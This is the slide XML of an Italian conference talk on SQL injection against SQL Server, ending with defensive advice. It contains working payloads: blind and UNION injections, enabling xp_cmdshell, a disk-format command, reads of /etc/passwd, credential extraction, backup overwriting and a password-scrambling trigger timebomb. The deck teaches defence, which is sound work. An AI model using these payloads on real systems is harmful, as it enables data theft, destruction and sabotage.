              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dati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EEC1706-6143-67D6-A693-C6B1B4B289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24CC5F0-533F-387D-9F58-766257A194E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(Title,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Result,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 SELECT 'Corso di tango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acrobatico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 CAST(CURRENT_TIMESTAMP AS DATE), CAST(CURRENT_TIMESTAMP AS DATE), 30,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2992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083DC95-3002-1CA4-9F0F-A815BC0F6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E3035CC-E2D0-1C86-680F-BEEF7D3BD6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#4: blind SQL injection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387EF08-5BA7-846B-194A-DECEE767AF5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EAC2156D-FE07-A41C-E0FF-8D4A7410BEF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 TOP (1)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*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dbo.Users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Email = 'test@example.com'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Password = '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IF (SELECT SYSTEM_USER) = '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sa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WAITFOR DELAY '00:00:05';--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>';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86213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514F820-9423-EBF7-BD2C-B1330B324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BADEC0B-32D2-6FE8-ACE2-0A9D36C46C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database </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sullo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stesso</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>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054B53A-18F4-4714-8669-FF27EEA95FB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0D62CB1C-1635-22DB-DE55-E5EFDA11590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D.name,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sys.databases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D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331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1095034-4560-3853-6547-41BB28E3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1739FE4-3F2A-9890-D33A-084851C742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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>degli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223A1C8-4328-3852-F322-6FB4778D3E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D732024A-DAC3-9C13-6056-83EE77BB551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CONCAT(S.name, '.', T.name, '.', C.name), NULL, NULL, NULL, NULL FROM AdventureWorksDW2022.sys.columns C INNER JOIN AdventureWorksDW2022.sys.tables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AdventureWorksDW2022.sys.schemas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080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BA00D75-EFF3-1640-CE37-BFCD9954B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C6A88EF-D502-802C-8A61-ED7FDB658E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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dati</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dagli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A60446D-BF41-D26F-5CF8-81594027249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84703A3-5167-660A-F30A-1C5DE0B4305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CONCAT(FirstName, ' ', LastName, ' (',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EmailAddress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') ', AddressLine1, AddressLine2, ', ', City, ', ',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StateProvinceCode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 ',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PostalCode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 - ', Phone),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BirthDate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 FROM AdventureWorksDW2022.dbo.ProspectiveBuyer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2329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78DFD79-353B-62CC-0721-736AA8D7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8ABA63F9-EADA-F26D-1300-881CF1B32D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5206626-351C-3A23-FCD4-29CD94D8DA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23D1D32-4C31-5793-A659-D290C9691A9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'show advanced options', 1;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08259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CC71E470-D6EC-3F1B-75EB-49C445D1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9FBC31F4-831A-CCF6-22E2-1971C95D35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05C9C47-7F7E-3FB4-447C-309D741D38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F5EBA2D4-44EB-7EC5-EC44-1F8A88BED27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CONCAT(C.name, ': ', CONVERT(NVARCHAR, COALESCE(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C.value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C.value_in_use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))),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sys.configurations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C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98665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BD52707C-C69C-0C47-787F-092BDD39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71C7CE0-1E80-6E92-9828-F6DD884491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Modificare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CC52DF68-7BAD-1806-AD32-BBD0810BA65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0D300D4-D224-B140-CCFE-259E013E02D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'max server memory (MB)', 128;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452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E719B13-508A-3F58-8A59-963E84E7E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913BCDD-E302-CB36-239C-8BA1038BDF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5833" y="1490741"/>
            <a:ext cx="7212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(Windows) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Modificare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BA5BCA3-4F63-8491-E767-E0CE1EEBD7C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C88EC712-3446-FBD4-D057-CDB2364CF89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xp_cmdshell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 1;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7923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A760962-B4C4-70C0-2A14-F3D81FD9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511F848-0D52-125A-D156-CEC5D0BB2F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(Windows) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Eseguire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>comandi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B3EBF6ED-7CE5-544D-0879-956B7F72DDB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B342687-4343-22E3-B13A-A74F905FA66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master..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xp_cmdshell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'format D: \q \u', NO_OUTPUT;--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99999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A86480F-F968-3F96-96E7-A605D3160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52626A5-45A6-18D0-7613-BFA863290E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Elencare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file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> server*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5FCEF64-BAEF-0734-31E9-C46228160C6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62A27826-F33A-EF78-7EE7-57721E61D1C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full_filesystem_path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sys.dm_os_enumerate_filesystem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('/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etc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','*.*')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18898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D106401-D067-904C-EC86-547F019C2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DF3FC83D-2442-488D-95BD-03E97D9D3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contenuto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> di un file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> server*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03A5E6E-8915-0046-FC00-D0803052D4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09683C9-7D13-5F24-E3B0-6998B9DC5A3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BulkColumn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OPENROWSET(BULK N'/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etc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/passwd', SINGLE_CLOB) AS Contents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1111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5F97DA1-B9FD-8812-BC2D-3629633D3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3CD8391-B464-B5CF-9082-3CF6D13A16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Elencare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file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> server**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8E38738-BFC1-146C-0375-484E39C4EBC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CB365B2-F282-A8A3-B267-19E743A8717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full_filesystem_path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sys.dm_os_enumerate_filesystem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('c:\temp\Customer','*.ps1')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0783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18FD7FC-B8B1-4CB8-73E1-C7086085F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7D50E93-7CD7-0D77-FD5A-1339293B60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contenuto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> di un file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> server**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87373525-BD8B-F495-EE5A-BB95CF88A8D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55AE3D5-D1BE-3259-AE95-98CB53EA6AC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BulkColumn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OPENROWSET(BULK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N'c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:\temp\Customer\AzCopyFromCustomerSAS.ps1', SINGLE_CLOB) AS Contents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1758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3FD5820-3FD0-9838-1C86-2B209857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7F6F43C7-FDD5-D10F-AC8F-9CF052EC98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Estrarre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>credenziali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chiaro</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> da uno script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9804557-1CD6-10FF-47A5-107CBC09036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755FCC-4ABD-00BB-6CC0-DD380C12BD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631" y="2027670"/>
            <a:ext cx="5766738" cy="2180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6141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B9B7C7E-CFB0-1A67-52EC-00BE10D91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1C420A99-8D1E-F15B-3A68-9B6CFDA4F5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Estrarre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>credenziali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chiaro</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> da uno script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A6B3B25B-C446-2F2F-4DCF-87F45774B23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FB3EA5-5B3F-5E47-D8A7-457F41FAAB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631" y="2027670"/>
            <a:ext cx="5766738" cy="2180183"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1" descr="A pair of handcuffs on a black background&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60E8B240-5C2C-E519-A89D-434A5EE7E3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0702" y="2225258"/>
            <a:ext cx="1982595" cy="1982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0167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FC4F3D9-4C60-3D2D-5635-53F8E82B8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49DB303-33EA-2975-5CBD-8F7C630A93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Coprire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>proprie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tracce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C28B8EFA-2249-C665-5F5C-FDC45E80FD2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D4D5A63-6896-0F75-994E-CAA72275A31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677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D088E20-8A21-173F-97BF-AE0FFABA3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B9CE168-F2C0-AFE6-50D6-3D6C6559B5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Elencare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backup </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dei</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>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B866514A-43EE-105A-8743-47E0B02E90E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A74DCF03-0F8A-B339-2F22-241E946B3DC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STRING_AGG(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physical_device_name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'; '),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msdb.dbo.backupmediafamily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GROUP BY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media_set_id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02904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2261BE6-231D-00C1-8BE4-09FAAB65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DCFECB07-BD25-1BB0-3CBC-99BC37D80D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Rendere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>inutilizzabili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backup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91EC2C8-9A30-AC61-0011-C9A53419593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666FACCF-5F3E-11B9-D22D-F2A2E0523C2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BACKUP DATABASE [model] TO  DISK = N'/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tmp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/AdventureWorksDW2022.bak' WITH NOFORMAT, INIT,  NAME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N'hasta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-la-vista-baby', SKIP, NOREWIND, NOUNLOAD,  STATS = 10;--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6262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24C9EF8A-9556-41D5-AB4B-3535574EA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350EB5A3-D931-1FA3-A0AE-0BC0E14F09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sz="2800" dirty="0" err="1"/>
              <a:t>Rendere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>inutilizzabile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>l’applicazione</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> (timebomb)</a:t>
            </a:r>
            <a:endParaRPr sz="2800"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52C6432-ED89-354B-D6CF-496AACC4C19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64656B3C-70FE-D695-1CB7-59C5CE6DD46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EXEC('CREATE TRIGGER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dbo.VersionInfo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AFTER INSERT AS UPDATE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SET Password = HASHBYTES(''SHA2_256'', Password)');--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2888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3C9C9FD-93EF-1904-56D6-857CFCCC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14845C2B-3DDF-6FB7-0E61-419F729FBA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sz="2800" dirty="0" err="1"/>
              <a:t>Automatizzare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> il </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>recupero</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> di </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>informazioni</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:endParaRPr sz="2800"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13BD0685-2EF7-B080-AE47-23A17BF82B1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DC7D8B-CBAE-F067-1C2D-0479F0D9FF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558" y="2071025"/>
            <a:ext cx="7116883" cy="2527572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CAE9CA7A-581C-E87C-FF99-BBB2AEB53D90}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="145335" y="3905881"/>
            <a:ext cx="811454" cy="9689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pair of handcuffs on a black background&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5DFDA172-FB09-1D08-33F7-E92EA5C5E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335" y="4063786"/>
            <a:ext cx="630705" cy="63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6057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0DCF0E6B-8D63-563B-DC82-D5B8ACDC0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50D4FA1-0367-8DEC-38C0-F4BADFC40D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query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innocua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1906B54-350C-2399-C432-2B0EC9A07C8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90AEC-DBB7-DB6F-FEF1-8892A7B32D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9653" y="2421134"/>
            <a:ext cx="6715693" cy="179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48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42ECFBC-E993-6FFB-BF6C-3A73BE033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85BA0E2-AC16-B48C-AC9B-5DC26A89AD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Una query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innocua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8E6A1AA-B8C4-7F1A-E411-BAE292B067E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8AD7780F-67DE-71ED-089F-F2CF4EAC75B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 OR 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'a1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'=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69060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850BBD45-A471-DD73-E4BE-769F8739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74860291-D15F-DA8C-1E61-737506D410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7952" y="1490741"/>
            <a:ext cx="7848095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Altri accorgimenti: utente dedicato, least privilege</a:t>
            </a:r>
            <a:endParaRPr sz="2400"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4330DDB9-4EC3-C315-E7AE-E0A149A4259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F88177-6642-C600-E0E4-F28053B23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135" y="2063441"/>
            <a:ext cx="6202729" cy="248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809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11DAA30C-0B39-C748-D4D4-5684AF42B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1BDA0967-4F3B-78E3-0408-375C8A6861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93525" y="1490741"/>
            <a:ext cx="535695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Altri accorgimenti: ledger tables</a:t>
            </a:r>
            <a:endParaRPr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B4325C7B-EC94-C01F-7DB8-1DBC522F950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44FAEA-2793-0A9B-415B-EBB61A6662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08" y="2063441"/>
            <a:ext cx="3108984" cy="2562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9348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4F88D046-96ED-2B53-2887-BD66C18CC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D121D8B8-EB67-47D1-E250-A5F41CBEED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93525" y="1490741"/>
            <a:ext cx="535695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Non solo front-end</a:t>
            </a:r>
            <a:endParaRPr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B0BE3B9B-C834-B8BB-90A0-DE3B3FBC542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0;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1755B24A-5122-EF7A-F2FC-66195D9795B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4263163"/>
            <a:ext cx="6887100" cy="22405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050" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://sqlserverupdates.com/news/new-security-updates-to-fix-sql-injection-vulnerabilities/</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono" pitchFamily="1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1E37A7-F646-67C6-41BE-2569672EAD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8207" y="1999776"/>
            <a:ext cx="2567586" cy="216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5255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3232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6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2894226"/>
            <a:ext cx="8520600" cy="119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Grazie!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u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://github.com/CodicePlastico/BibeCatalogue</a:t>
            </a:r>
            <a:endParaRPr sz="17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288581" y="1497613"/>
            <a:ext cx="4566836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Bobby Tables (xkcd.com #327)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0"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1311750" y="2070313"/>
            <a:ext cx="65205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B7B7B7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Molto più di una textbox</a:t>
            </a:r>
            <a:endParaRPr sz="1100" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B7B7B7"/>
              </a:solidFill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3" name="Picture 2" descr="A cartoon of two people&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74250F4B-E526-08C0-F935-DD5E12CE85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451" y="2432471"/>
            <a:ext cx="5955097" cy="18348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1325</TotalTime>
  <Words>2518</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>96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Arial</vt:lpstr>
      <vt:lpstr>Comic Mono</vt:lpstr>
      <vt:lpstr>Barlow Condensed Light</vt:lpstr>
      <vt:lpstr>Anonymous Pro</vt:lpstr>
      <vt:lpstr>Barlow Condensed SemiBold</vt:lpstr>
      <vt:lpstr>Barlow Condensed Medium</vt:lpstr>
      <vt:lpstr>Barlow Condensed</vt:lpstr>
      <vt:lpstr>Simple Light</vt:lpstr>
      <vt:lpstr>SQL Injection crash(ed) course – Try this ONLY at home! Come alcune scelte di comodo in fase di sviluppo possono portare ad effetti... più che indesiderati</vt:lpstr>
      <vt:lpstr>Una query innocua che non farò mai più</vt:lpstr>
      <vt:lpstr>O meglio, una query innocua che non implementerò mai più così</vt:lpstr>
      <vt:lpstr>Una buona password…</vt:lpstr>
      <vt:lpstr>Una buona password…</vt:lpstr>
      <vt:lpstr>SQL Injection #1: WHERE poisoning</vt:lpstr>
      <vt:lpstr>SQL Injection #1: WHERE poisoning</vt:lpstr>
      <vt:lpstr>Recuperare il numero di campi estratti</vt:lpstr>
      <vt:lpstr>SQL Injection #2: UNION ALL</vt:lpstr>
      <vt:lpstr>SQL Injection #2: UNION ALL</vt:lpstr>
      <vt:lpstr>Recuperare la versione del database server*</vt:lpstr>
      <vt:lpstr>Recuperare la versione del database server**</vt:lpstr>
      <vt:lpstr>Recuperare la struttura del database*</vt:lpstr>
      <vt:lpstr>Recuperare la struttura del database**</vt:lpstr>
      <vt:lpstr>Recuperare la struttura del database</vt:lpstr>
      <vt:lpstr>Recuperare il contenuto di una tabella</vt:lpstr>
      <vt:lpstr>SQL Injection #3: query concatenating</vt:lpstr>
      <vt:lpstr>SQL Injection #3: query concatenating</vt:lpstr>
      <vt:lpstr>Inserimento dati</vt:lpstr>
      <vt:lpstr>Inserimento dati</vt:lpstr>
      <vt:lpstr>SQL Injection #4: blind SQL injection</vt:lpstr>
      <vt:lpstr>Recuperare altri database sullo stesso server</vt:lpstr>
      <vt:lpstr>Recuperare la struttura degli altri database</vt:lpstr>
      <vt:lpstr>Recuperare dati dagli altri database</vt:lpstr>
      <vt:lpstr>Recuperare la configurazione del server</vt:lpstr>
      <vt:lpstr>Recuperare la configurazione del server</vt:lpstr>
      <vt:lpstr>Modificare la configurazione del server</vt:lpstr>
      <vt:lpstr>(Windows) Modificare la configurazione del server</vt:lpstr>
      <vt:lpstr>(Windows) Eseguire comandi sul server</vt:lpstr>
      <vt:lpstr>Elencare i file sul server*</vt:lpstr>
      <vt:lpstr>Recuperare il contenuto di un file sul server*</vt:lpstr>
      <vt:lpstr>Elencare i file sul server**</vt:lpstr>
      <vt:lpstr>Recuperare il contenuto di un file sul server**</vt:lpstr>
      <vt:lpstr>Estrarre le credenziali in chiaro da uno script</vt:lpstr>
      <vt:lpstr>Estrarre le credenziali in chiaro da uno script</vt:lpstr>
      <vt:lpstr>Coprire le proprie tracce</vt:lpstr>
      <vt:lpstr>Elencare i backup dei database</vt:lpstr>
      <vt:lpstr>Rendere inutilizzabili i backup</vt:lpstr>
      <vt:lpstr>Rendere inutilizzabile l’applicazione (timebomb)</vt:lpstr>
      <vt:lpstr>Automatizzare il recupero di informazioni: sqlmap</vt:lpstr>
      <vt:lpstr>Una query innocua che implementerò così</vt:lpstr>
      <vt:lpstr>Una query innocua che implementerò così</vt:lpstr>
      <vt:lpstr>Altri accorgimenti: utente dedicato, least privilege</vt:lpstr>
      <vt:lpstr>Altri accorgimenti: ledger tables</vt:lpstr>
      <vt:lpstr>Non solo front-end</vt:lpstr>
      <vt:lpstr>Grazie!  https://github.com/CodicePlastico/BibeCatalogue</vt:lpstr>
      <vt:lpstr>Bobby Tables (xkcd.com #327)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Alberto Turelli</dc:creator>
  <cp:lastModifiedBy>Alberto Turelli</cp:lastModifiedBy>
  <cp:revision>46</cp:revision>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-11-02T11:50:18Z</dcterms:modified>
</cp:coreProperties>
</file>